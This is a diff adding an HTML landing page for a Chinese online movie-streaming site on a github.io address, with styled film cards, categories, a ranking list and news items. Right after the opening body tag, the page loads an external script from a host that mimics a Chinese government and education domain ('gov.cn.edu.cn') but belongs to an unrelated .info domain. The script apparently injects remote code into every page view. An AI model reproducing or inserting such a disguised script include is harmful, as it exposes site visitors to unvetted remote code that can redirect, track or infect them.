@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>窝窝网电影网 - 高清电影在线观看首选平台</title>
+<meta name="description" content="窝窝网电影网提供最新院线大片、热播剧集、动漫综艺高清在线观看，移动端自适应，畅享流畅观影体验。" />
+<meta name="keywords" content="窝窝网电影网,电影,高清影视,在线观看,电视剧,综艺,wowowangdianyingwang-h5.github.io" />
+<meta name="author" content="窝窝网电影网" />
+<meta name="robots" content="index,follow" />
+
+<style>
+/* ===== 全局重置 ===== */
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+body {
+  font-family: "PingFang SC", "Microsoft YaHei", -apple-system, sans-serif;
+  background: #f8f9fa;
+  color: #2d3436;
+  line-height: 1.7;
+}
+
+a {
+  color: #e17055;
+  text-decoration: none;
+  transition: color 0.3s;
+}
+
+a:hover {
+  color: #d63031;
+}
+
+img {
+  max-width: 100%;
+  display: block;
+}
+
+/* ===== 顶部导航 ===== */
+.header {
+  background: #fff;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+  position: sticky;
+  top: 0;
+  z-index: 999;
+}
+
+.header-inner {
+  max-width: 1200px;
+  margin: 0 auto;
+  padding: 14px 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.brand {
+  font-size: 24px;
+  font-weight: 800;
+  color: #d63031;
+  letter-spacing: 1px;
+}
+
+.brand span {
+  color: #e17055;
+}
+
+.nav-list {
+  display: flex;
+  gap: 28px;
+  list-style: none;
+}
+
+.nav-list a {
+  font-size: 16px;
+  font-weight: 500;
+  color: #636e72;
+  position: relative;
+}
+
+.nav-list a::after {
+  content: "";
+  position: absolute;
+  bottom: -4px;
+  left: 0;
+  width: 0;
+  height: 2px;
+  background: #d63031;
+  transition: width 0.3s;
+}
+
+.nav-list a:hover::after {
+  width: 100%;
+}
+
+/* ===== Banner ===== */
+.banner {
+  background: linear-gradient(135deg, #d63031 0%, #e17055 60%, #fdcb6e 100%);
+  padding: 70px 20px;
+  text-align: center;
+  color: #fff;
+}
+
+.banner h1 {
+  font-size: 42px;
+  font-weight: 900;
+  margin-bottom: 14px;
+  text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+}
+
+.banner .subtitle {
+  font-size: 18px;
+  opacity: 0.95;
+  margin-bottom: 8px;
+}
+
+.banner .url {
+  font-size: 15px;
+  opacity: 0.85;
+  background: rgba(255,255,255,0.2);
+  display: inline-block;
+  padding: 4px 16px;
+  border-radius: 20px;
+  margin-top: 10px;
+}
+
+/* ===== 通用区块 ===== */
+.section {
+  max-width: 1200px;
+  margin: 56px auto;
+  padding: 0 20px;
+}
+
+.section-head {
+  display: flex;
+  align-items: center;
+  margin-bottom: 28px;
+}
+
+.section-head .bar {
+  width: 5px;
+  height: 28px;
+  background: #d63031;
+  border-radius: 3px;
+  margin-right: 12px;
+}
+
+.section-head h2 {
+  font-size: 26px;
+  font-weight: 700;
+  color: #2d3436;
+}
+
+.section-head .more {
+  margin-left: auto;
+  font-size: 14px;
+  color: #e17055;
+}
+
+/* ===== 栏目一：热播推荐（横向滚动卡片） ===== */
+.scroll-wrap {
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+  padding-bottom: 10px;
+}
+
+.scroll-track {
+  display: flex;
+  gap: 18px;
+}
+
+.film-card {
+  flex: 0 0 180px;
+  background: #fff;
+  border-radius: 12px;
+  overflow: hidden;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.06);
+  transition: transform 0.3s, box-shadow 0.3s;
+}
+
+.film-card:hover {
+  transform: translateY(-6px);
+  box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+}
+
+.film-cover {
+  width: 100%;
+  height: 240px;
+  object-fit: cover;
+}
+
+.film-body {
+  padding: 12px;
+}
+
+.film-body h3 {
+  font-size: 15px;
+  font-weight: 600;
+  margin-bottom: 4px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.film-body .score {
+  font-size: 13px;
+  color: #fdcb6e;
+  font-weight: 700;
+}
+
+/* ===== 栏目二：影视分类（色块网格） ===== */
+.cat-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 20px;
+}
+
+.cat-item {
+  border-radius: 14px;
+  padding: 28px 24px;
+  color: #fff;
+  position: relative;
+  overflow: hidden;
+  min-height: 120px;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+}
+
+.cat-item:nth-child(1) { background: linear-gradient(135deg, #6c5ce7, #a29bfe); }
+.cat-item:nth-child(2) { background: linear-gradient(135deg, #00b894, #55efc4); }
+.cat-item:nth-child(3) { background: linear-gradient(135deg, #e17055, #fab1a0); }
+.cat-item:nth-child(4) { background: linear-gradient(135deg, #0984e3, #74b9ff); }
+.cat-item:nth-child(5) { background: linear-gradient(135deg, #d63031, #ff7675); }
+.cat-item:nth-child(6) { background: linear-gradient(135deg, #fdcb6e, #ffeaa7); color: #2d3436; }
+
+.cat-item h3 {
+  font-size: 20px;
+  font-weight: 700;
+  margin-bottom: 6px;
+}
+
+.cat-item p {
+  font-size: 13px;
+  opacity: 0.9;
+}
+
+.cat-item a {
+  color: inherit;
+}
+
+/* ===== 栏目三：排行榜（表格样式） ===== */
+.rank-table {
+  background: #fff;
+  border-radius: 14px;
+  overflow: hidden;
+  box-shadow: 0 4px 16px rgba(0,0,0,0.06);
+}
+
+.rank-row {
+  display: flex;
+  align-items: center;
+  padding: 16px 20px;
+  border-bottom: 1px solid #f1f2f6;
+  transition: background 0.2s;
+}
+
+.rank-row:last-child {
+  border-bottom: none;
+}
+
+.rank-row:hover {
+  background: #fff5f5;
+}
+
+.rank-badge {
+  flex: 0 0 40px;
+  height: 40px;
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+  font-weight: 800;
+  margin-right: 16px;
+}
+
+.rank-row:nth-child(1) .rank-badge { background: #fdcb6e; color: #fff; }
+.rank-row:nth-child(2) .rank-badge { background: #b2bec3; color: #fff; }
+.rank-row:nth-child(3) .rank-badge { background: #e17055; color: #fff; }
+.rank-row:nth-child(n+4) .rank-badge { background: #dfe6e9; color: #636e72; }
+
+.rank-info {
+  flex: 1;
+}
+
+.rank-info h4 {
+  font-size: 16px;
+  font-weight: 600;
+}
+
+.rank-info span {
+  font-size: 13px;
+  color: #b2bec3;
+}
+
+.rank-hot {
+  flex: 0 0 80px;
+  text-align: right;
+  font-size: 14px;
+  color: #e17055;
+  font-weight: 600;
+}
+
+/* ===== 栏目四：最新资讯（图文列表） ===== */
+.news-list {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 24px;
+}
+
+.news-item {
+  display: flex;
+  gap: 16px;
+  background: #fff;
+  border-radius: 12px;
+  padding: 16px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+  transition: transform 0.3s;
+}
+
+.news-item:hover {
+  transform: translateX(4px);
+}
+
+.news-item img {
+  flex: 0 0 120px;
+  height: 80px;
+  border-radius: 8px;
+  object-fit: cover;
+}
+
+.news-item .news-text h4 {
+  font-size: 15px;
+  font-weight: 600;
+  margin-bottom: 6px;
+  line-height: 1.4;
+}
+
+.news-item .news-text p {
+  font-size: 13px;
+  color: #b2bec3;
+}
+
+/* ===== 栏目五：关于我们（时间线） ===== */
+.timeline {
+  position: relative;
+  padding-left: 30px;
+}
+
+.timeline::before {
+  content: "";
+  position: absolute;
+  left: 8px;
+  top: 0;
+  bottom: 0;
+  width: 2px;
+  background: #fab1a0;
+}
+
+.tl-item {
+  position: relative;
+  margin-bottom: 28px;
+  background: #fff;
+  border-radius: 12px;
+  padding: 20px 24px;
+  box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+}
+
+.tl-item::before {
+  content: "";
+  position: absolute;
+  left: -26px;
+  top: 24px;
+  width: 14px;
+  height: 14px;
+  border-radius: 50%;
+  background: #d63031;
+  border: 3px solid #fff;
+  box-shadow: 0 0 0 2px #fab1a0;
+}
+
+.tl-item h4 {
+  font-size: 17px;
+  font-weight: 700;
+  color: #d63031;
+  margin-bottom: 6px;
+}
+
+.tl-item p {
+  font-size: 14px;
+  color: #636e72;
+}
+
+/* ===== 底部 ===== */
+.footer {
+  background: #2d3436;
+  color: #b2bec3;
+  padding: 40px 20px 30px;
+  text-align: center;
+}
+
+.footer .foot-brand {
+  font-size: 20px;
+  font-weight: 800;
+  color: #fff;
+  margin-bottom: 12px;
+}
+
+.footer .foot-links {
+  margin-bottom: 16px;
+}
+
+.footer .foot-links a {
+  color: #b2bec3;
+  margin: 0 12px;
+  font-size: 14px;
+}
+
+.footer .foot-links a:hover {
+  color: #fdcb6e;
+}
+
+.footer .copy {
+  font-size: 13px;
+  opacity: 0.7;
+}
+
+/* ===== 移动端适配 ===== */
+@media (max-width: 768px) {
+  .header-inner {
+    flex-direction: column;
+    gap: 10px;
+  }
+
+  .nav-list {
+    gap: 18px;
+  }
+
+  .banner {
+    padding: 50px 16px;
+  }
+
+  .banner h1 {
+    font-size: 30px;
+  }
+
+  .banner .subtitle {
+    font-size: 15px;
+  }
+
+  .section {
+    margin: 40px auto;
+  }
+
+  .section-head h2 {
+    font-size: 22px;
+  }
+
+  .film-card {
+    flex: 0 0 150px;
+  }
+
+  .film-cover {
+    height: 200px;
+  }
+
+  .news-list {
+    grid-template-columns: 1fr;
+  }
+
+  .news-item img {
+    flex: 0 0 90px;
+    height: 70px;
+  }
+
+  .rank-row {
+    padding: 12px 14px;
+  }
+
+  .cat-grid {
+    grid-template-columns: 1fr 1fr;
+  }
+}
+
+@media (max-width: 480px) {
+  .nav-list {
+    gap: 14px;
+    font-size: 14px;
+  }
+
+  .nav-list a {
+    font-size: 14px;
+  }
+
+  .cat-grid {
+    grid-template-columns: 1fr;
+  }
+
+  .banner h1 {
+    font-size: 26px;
+  }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- ===== 顶部导航 ===== -->
+<div class="header">
+  <div class="header-inner">
+    <div class="brand">窝窝<span>网电影网</span></div>
+    <ul class="nav-list">
+      <li><a href="#">首页</a></li>
+      <li><a href="#">热播推荐</a></li>
+      <li><a href="#">影视分类</a></li>
+      <li><a href="#">排行榜</a></li>
+      <li><a href="#">最新资讯</a></li>
+      <li><a href="#">关于我们</a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- ===== Banner ===== -->
+<div class="banner">
+  <h1>窝窝网电影网</h1>
+  <p class="subtitle">海量高清影视 · 随时随地畅享</p>
+  <p class="subtitle">电影 | 电视剧 | 动漫 | 综艺 一站式观影平台</p>
+  <div class="url">https://wowowangdianyingwang-h5.github.io</div>
+</div>
+
+<!-- ===== 栏目一：热播推荐 ===== -->
+<div class="section">
+  <div class="section-head">
+    <div class="bar"></div>
+    <h2>热播推荐</h2>
+    <a href="#" class="more">更多 &gt;</a>
+  </div>
+  <div class="scroll-wrap">
+    <div class="scroll-track">
+      <div class="film-card">
+        <img class="film-cover" src="https://via.placeholder.com/300x400/6c5ce7/ffffff?text=Movie" alt="电影海报" />
+        <div class="film-body">
+          <h3>星际穿越</h3>
+          <span class="score">★ 9.4</span>
+        </div>
+      </div>
+      <div class="film-card">
+        <img class="film-cover" src="https://via.placeholder.com/300x400/00b894/ffffff?text=Movie" alt="电影海报" />
+        <div class="film-body">
+          <h3>盗梦空间</h3>
+          <span class="score">★ 9.3</span>
+        </div>
+      </div>
+      <div class="film-card">
+        <img class="film-cover" src="https://via.placeholder.com/300x400/e17055/ffffff?text=Movie" alt="电影海报" />
+        <div class="film-body">
+          <h3>复仇者联盟</h3>
+          <span class="score">★ 8.5</span>
+        </div>
+      </div>
+      <div class="film-card">
+        <img class="film-cover" src="https://via.placeholder.com/300x400/0984e3/ffffff?text=Movie" alt="电影海报" />
+        <div class="film-body">
+          <h3>阿凡达</h3>
+          <span class="score">★ 8.8</span>
+        </div>
+      </div>
+      <div class="film-card">
+        <img class="film-cover" src="https://via.placeholder.com/300x400/d63031/ffffff?text=Movie" alt="电影海报" />
+        <div class="film-body">
+          <h3>泰坦尼克号</h3>
+          <span class="score">★ 9.1</span>
+        </div>
+      </div>
+      <div class="film-card">
+        <img class="film-cover" src="https://via.placeholder.com/300x400/fdcb6e/333333?text=Movie" alt="电影海报" />
+        <div class="film-body">
+          <h3>千与千寻</h3>
+          <span class="score">★ 9.4</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 栏目二：影视分类 ===== -->
+<div class="section">
+  <div class="section-head">
+    <div class="bar"></div>
+    <h2>影视分类</h2>
+    <a href="#" class="more">更多 &gt;</a>
+  </div>
+  <div class="cat-grid">
+    <div class="cat-item">
+      <a href="#">
+        <h3>🎬 动作大片</h3>
+        <p>肾上腺素飙升的视觉盛宴</p>
+      </a>
+    </div>
+    <div class="cat-item">
+      <a href="#">
+        <h3>😂 喜剧搞笑</h3>
+        <p>轻松一刻，快乐加倍</p>
+      </a>
+    </div>
+    <div class="cat-item">
+      <a href="#">
+        <h3>💕 爱情浪漫</h3>
+        <p>触动心弦的甜蜜故事</p>
+      </a>
+    </div>
+    <div class="cat-item">
+      <a href="#">
+        <h3>🔮 科幻悬疑</h3>
+        <p>脑洞大开的未来世界</p>
+      </a>
+    </div>
+    <div class="cat-item">
+      <a href="#">
+        <h3>😱 恐怖惊悚</h3>
+        <p>心跳加速的极致体验</p>
+      </a>
+    </div>
+    <div class="cat-item">
+      <a href="#">
+        <h3>📺 电视剧集</h3>
+        <p>热门剧集持续更新</p>
+      </a>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 栏目三：排行榜 ===== -->
+<div class="section">
+  <div class="section-head">
+    <div class="bar"></div>
+    <h2>今日热榜</h2>
+    <a href="#" class="more">更多 &gt;</a>
+  </div>
+  <div class="rank-table">
+    <div class="rank-row">
+      <div class="rank-badge">1</div>
+      <div class="rank-info">
+        <h4>奥本海默</h4>
+        <span>剧情 / 传记 · 2023</span>
+      </div>
+      <div class="rank-hot">🔥 98.6万</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-badge">2</div>
+      <div class="rank-info">
+        <h4>封神第一部</h4>
+        <span>神话 / 动作 · 2023</span>
+      </div>
+      <div class="rank-hot">🔥 87.3万</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-badge">3</div>
+      <div class="rank-info">
+        <h4>流浪地球2</h4>
+        <span>科幻 / 灾难 · 2023</span>
+      </div>
+      <div class="rank-hot">🔥 76.1万</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-badge">4</div>
+      <div class="rank-info">
+        <h4>消失的她</h4>
+        <span>悬疑 / 犯罪 · 2023</span>
+      </div>
+      <div class="rank-hot">🔥 65.8万</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-badge">5</div>
+      <div class="rank-info">
+        <h4>长安三万里</h4>
+        <span>动画 / 历史 · 2023</span>
+      </div>
+      <div class="rank-hot">🔥 54.2万</div>
+    </div>
+    <div class="rank-row">
+      <div class="rank-badge">6</div>
+      <div class="rank-info">
+        <h4>芭比</h4>
+        <span>喜剧 / 奇幻 · 2023</span>
+      </div>
+      <div class="rank-hot">🔥 48.7万</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 栏目四：最新资讯 ===== -->
+<div class="section">
+  <div class="section-head">
+    <div class="bar"></div>
+    <h2>最新资讯</h2>
+    <a href="#" class="more">更多 &gt;</a>
+  </div>
+  <div class="news-list">
+    <div class="news-item">
+      <img src="https://via.placeholder.com/200x140/6c5ce7/ffffff?text=News" alt="资讯图片" />
+      <div class="news-text">
+        <h4>2026国庆档电影票房创新高，多部国产片表现亮眼</h4>
+        <p>2026-10-05 · 行业资讯</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <img src="https://via.placeholder.com/200x140/00b894/ffffff?text=News" alt="资讯图片" />
+      <div class="news-text">
+        <h4>好莱坞大片《星际远征》定档12月全球同步上映</h4>
+        <p>2026-10-04 · 电影新闻</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <img src="https://via.placeholder.com/200x140/e17055/ffffff?text=News" alt="资讯图片" />
+      <div class="news-text">
+        <h4>经典港片4K修复版登陆窝窝网电影网，重温黄金年代</h4>
+        <p>2026-10-03 · 平台公告</p>
+      </div>
+    </div>
+    <div class="news-item">
+      <img src="https://via.placeholder.com/200x140/0984e3/ffffff?text=News" alt="资讯图片" />
+      <div class="news-text">
+        <h4>独家专访：导演张艺谋谈新片创作理念与拍摄幕后</h4>
+        <p>2026-10-02 · 人物专访</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 栏目五：关于我们 ===== -->
+<div class="section">
+  <div class="section-head">
+    <div class="bar"></div>
+    <h2>关于我们</h2>
+  </div>
+  <div class="timeline">
+    <div class="tl-item">
+      <h4>窝窝网电影网</h4>
+      <p>窝窝网电影网（wowowangdianyingwang-h5.github.io）是一个专注于高清影视在线观看的综合性影视平台，致力于为用户提供流畅、稳定、高质量的观影体验。平台涵盖电影、电视剧、动漫、综艺等丰富内容，支持多终端自适应访问。</p>
+    </div>
+    <div class="tl-item">
+      <h4>我们的使命</h4>
+      <p>让每一个人都能随时随地享受优质的影视内容，打造最便捷、最舒适的在线观影平台。</p>
+    </div>
+    <div class="tl-item">
+      <h4>联系方式</h4>
+      <p>官方网站：<a href="https://wowowangdianyingwang-h5.github.io">https://wowowangdianyingwang-h5.github.io</a></p>
+    </div>
+  </div>
+</div>
+
+<!-- ===== 底部 ===== -->
+<div class="footer">
+  <div class="foot-brand">窝窝网电影网</div>
+  <div class="foot-links">
+    <a href="#">首页</a>
+    <a href="#">电影库</a>
+    <a href="#">排行榜</a>
+    <a href="#">关于我们</a>
+  </div>
+  <div class="copy">© 2026 窝窝网电影网 wowowangdianyingwang-h5.github.io · 保留所有权利</div>
+</div>
+
+</body>
+</html>
